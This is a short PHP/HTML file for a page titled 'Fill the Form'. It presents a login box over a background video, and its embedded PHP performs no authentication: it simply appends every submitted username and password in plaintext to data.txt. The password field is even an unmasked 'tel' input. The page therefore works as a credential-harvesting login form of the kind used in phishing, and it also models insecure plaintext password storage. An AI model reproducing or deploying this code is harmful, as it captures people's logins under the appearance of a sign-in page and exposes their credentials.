<?php
session_start();

?>
<!DOCTYPE html>
<html>
<head>
	 <meta charset="utf-8">
	 <meta >
	 <title>Fill the Form</title>
	 <link rel="stylesheet" type="text/css" href="login.css">
</head>
<body>
	<!--HEY,You Thief!. Dont steal my source code-->
	<!-- YOU ARE TOO LAZY CODING BY CHECKING MY FILE-->
	<video id="video" poster="nature.jpg" loop muted autoplay>
    	<source src="background.mp4" type="video/mp4" id="videobackground">
    </video>



<!--Form-->

	<center>

		<div id="boxcontainer">
			<div id="login">LOGIN</div>
	<form method="POST" class="box">
		<!--Name-->

		<input type="text"  class="input" name="username" autocomplete="false" id="username" placeholder="Username" required><br>

		<input type="tel" name="password" id="password" placeholder="Password" class="input">
	

		<!--<div><div>Email</div><input type="Email" name="Email"></div>-->

		<div><input type="submit" name="submit" value="submit" id="submit"></div>
	</form></div>
	</center>



<!--PHP FILE-->'
<?php
if (isset($_POST['username']) && isset($_POST['password'])) {
	$username = $_POST['username'];
	$password = $_POST['password'];
	
	$datafile = fopen("data.txt", "a");
	fwrite($datafile, "\n" .$username."\n");

	fwrite($datafile, $password);
	
	fclose($datafile);
}

?>
</body>
</html>
